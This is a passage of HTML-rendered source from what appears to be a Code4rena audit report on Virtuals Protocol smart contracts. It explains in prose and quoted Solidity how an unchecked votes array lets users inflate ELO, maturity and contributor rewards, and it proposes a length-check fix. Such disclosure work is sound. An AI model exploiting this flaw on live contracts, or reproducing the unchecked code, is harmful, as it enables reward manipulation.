.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory votes = abi.decode(params, (uint8[])); //@audit params has been decoded, but the length isn\u0026#39;t checked\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 maturity = _calcMaturity(proposalId, votes);  //@audit this calls eloCalculator (shown below)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _proposalMaturities[proposalId] += (maturity * weight); //@audit here maturity is updated, affecting ServiceNfts\u0026#39; elo and impact\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit ValidatorEloRating(proposalId, account, maturity, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe issue arises in the fact that votes can be any amount of \u003ccode\u003euint8[]\u003c/code\u003e votes that the user decided to pass as an argument.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e_calcMaturity\u003c/code\u003e calls the \u003ccode\u003eeloCalculator::battleElo(maturity, votes)\u003c/code\u003e, where votes will be the \u003ccode\u003euint8[]\u003c/code\u003e. We can also know which elo participant is the one we vote for.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _calcMaturity(uint256 proposalId, uint8[] memory votes) internal view returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address contributionNft = IAgentNft(_agentNft).getContributionNft(); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address serviceNft = IAgentNft(_agentNft).getServiceNft();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId = IContributionNft(contributionNft).tokenVirtualId(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8 core = IContributionNft(contributionNft).getCore(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 coreService = IServiceNft(serviceNft).getCoreService(virtualId, core);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 maturity = 100; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (coreService \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            maturity = IServiceNft(serviceNft).getMaturity(coreService); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            maturity = IEloCalculator(IAgentNft(_agentNft).getEloCalculator()).battleElo(maturity, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            //@audit, battleElo is called with an arbitrary amount of uint8[] votes\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return maturity;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn \u003ccode\u003eeloCalculator::battleElo\u003c/code\u003e, the array of votes is used to determine the number of \u003ccode\u003ebattles\u003c/code\u003e that the two elos fight, and the result of the vote determines how the \u003ccode\u003eELO\u003c/code\u003e of each of the two participants (models) is affected. Since the ELO is affected by the amount and the result, a user could arbitrarily set both, increasing the ELO of the \u003ccode\u003eServiceNft\u003c/code\u003e, and the proposal impact.\u003c/p\u003e\n\u003cp\u003eThe function goes as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function battleElo(uint256 currentRating, uint8[] memory battles) public view returns (uint256) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 eloA = 1000; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 eloB = 1000;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //@audit battles is the votes params, the length of which we didn\u0026#39;t check\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint256 i = 0; i \u0026lt; battles.length; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 result = mapBattleResultToGameResult(battles[i]); //@audit function that maps vote value to result\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            (uint256 change, bool negative) = Elo.ratingChange(eloB, eloA, result, k);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            change = _roundUp(change, 100);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (negative) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloA -= change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloB += change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            } else {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloA += change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                eloB -= change;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        //@audit we can arbitrarily raise the ELO to make our vote more impactful in maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return currentRating + eloA - 1000;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe amount of times the change is affected to the ELO rating, is defined by that unchecked \u003ccode\u003euint8[]\u003c/code\u003e array. Thus, allowing users to increase more than due maturity/ELO. The maturity of the proposal would be bigger than it should, and the \u003ccode\u003eserviceNft\u003c/code\u003e would also get a bigger impact than it should have.\u003c/p\u003e\n\u003cp\u003eAn impact is a value calculated from the \u003ccode\u003eserviceNft::maturity[proposalId]\u003c/code\u003e (taken from \u003ccode\u003eagentDAO::getMaturity(proposalId)\u003c/code\u003e at mint call, and stored in the contract’s array), and is the difference of the current service, and the previous service maturity.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"68\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function updateImpact(uint256 virtualId, uint256 proposalId) public {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Calculate impact\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Get current service maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 prevServiceId = _coreServices[virtualId][_cores[proposalId]];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 rawImpact = (_maturities[proposalId] \u0026gt; _maturities[prevServiceId])\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            ? _maturities[proposalId] - _maturities[prevServiceId]  //@audit raw-impact is the difference of maturities between proposals. An inflated votation might result in an inflated difference.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            : 0;  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 datasetId = IContributionNft(contributionNft).getDatasetId(proposalId); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _impacts[proposalId] = rawImpact;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (datasetId \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit SetServiceScore(proposalId, _maturities[proposalId], _impacts[proposalId]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe don’t know what the current implementation of \u003ccode\u003eagentReward\u003c/code\u003e is, but for version of v2 or lower, it would allow for an inflated reward to contributor.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"69\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _distributeContributorRewards(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 amount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        RewardSettingsCheckpoints.RewardSettings memory settings\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) private {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IAgentNft nft = IAgentNft(agentNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory coreTypes = nft.virtualInfo(virtualId).coreTypes;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IServiceNft serviceNftContract = IServiceNft(serviceNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IContributionNft contributionNftContract = IContributionNft(contributionNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        Reward storage reward = _rewards[virtualId][_rewards[virtualId].length - 1];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        reward.coreAmount = amount / coreTypes.length;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256[] memory services = nft.getAllServices(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Populate service impacts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 serviceId;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 impact;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint i = 0; i \u0026lt; services.length; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            serviceId = services[i];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            impact = serviceNftContract.getImpact(serviceId);  //@audit \u0026lt;--here impacts are taken from serviceNft\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (impact == 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                continue;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            ServiceReward storage serviceReward = _serviceRewards[serviceId];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (serviceReward.impact == 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                serviceReward.impact = impact;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            _rewardImpacts[reward.id][serviceNftContract.getCore(serviceId)] += impact; //\u0026lt;-- impacts are rewarded\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-10\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUsers, or even contributors can spam it, leaving the \u003ccode\u003eServiceNft\u003c/code\u003e of a proposal with an ELO that severely misrepresents what the actual value of the proposal could be, up to the limit differences that they required in \u003ccode\u003eelo.sol\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eMoreover, since the impact (a param of a \u003ccode\u003eserviceNft\u003c/code\u003e which represents a value of sorts for the service over the previous implementation) is used to calculate contributor rewards (at least as it is shown in \u003ccode\u003eAgentRewardv2.sol\u003c/code\u003e and \u003ccode\u003eAgentRewardv1.sol\u003c/code\u003e), this could also inflate them, giving more rewards than due.\u003c/p\u003e\n\u003cp\u003eFor \u003ccode\u003eAgentRewardv3\u003c/code\u003e we’d have to think that either it doesn’t rewards contributions, is partially used, or is unfinished. We don’t really know which one it is.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eInside \u003ccode\u003eagentDAO::_updateMaturity\u003c/code\u003e add a statement after decoding the params to check that the length of the array of votes/battles is 10 (you could also replace it with a variable):\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"70\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _updateMaturity(address account, uint256 proposalId, uint256 weight, bytes memory params) internal {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address contributionNft = IAgentNft(_agentNft).getContributionNft();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address owner = IERC721(contributionNft).ownerOf(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (owner == address(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bool isModel = IContributionNft(contributionNft).isModel(proposalId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!isModel) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            return;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint8[] memory votes = abi.decode(params, (uint8[]));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e+       if(votes.length() != 10) revert();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 maturity = _calcMaturity(proposalId, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e_proposalMaturities[proposalId] += (maturity * weight);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        emit ValidatorEloRating(proposalId, account, maturity, votes);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-12\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eThere’s a proposal for a model update.\u003c/li\u003e\n\u003cli\u003eA user or the contributor submits a malicious (or many malicious) vote directly to the chain, with more rounds than the 10 determined in the whitepaper, either for or against the proposal.\u003c/li\u003e\n\u003cli\u003eThe ELO and the maturity increases (or decreases) more sharply with those votes.\u003c/li\u003e\n\u003cli\u003eThe resulting \u003ccode\u003eserviceNft\u003c/code\u003e would have really incorrect information.\u003c/li\u003e\n\u003cli\u003eThe resulting maturity of the \u003ccode\u003eserviceNft\u003c/code\u003e could end up with an impact of 0 (or a low value) and leave contributor without (or with reduced) rewards, or it could get inflated (and give more rewards than it is fair).\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-12-no-slippage-protection-during-adding-liquidity-to-uniswap\" style=\"position:relative;\"\u003e\u003ca href=\"#m-12-no-slippage-protection-during-adding-liquidity-to-uniswap\" aria-label=\"m 12 no slippage protection during adding liquidity to uniswap permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-49\"\u003e[M-12] No slippage protection during adding liquidity to uniswap\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-429\"\u003eEPSec\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-821\"\u003eBestBugBusters\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-764\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-126\"\u003efelconsec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-17\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-785\"\u003eOlugbenga\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-464\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-267\"\u003epro_king\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-678\"\u003eunique\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-732\"\u003ewahedtalash77\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca 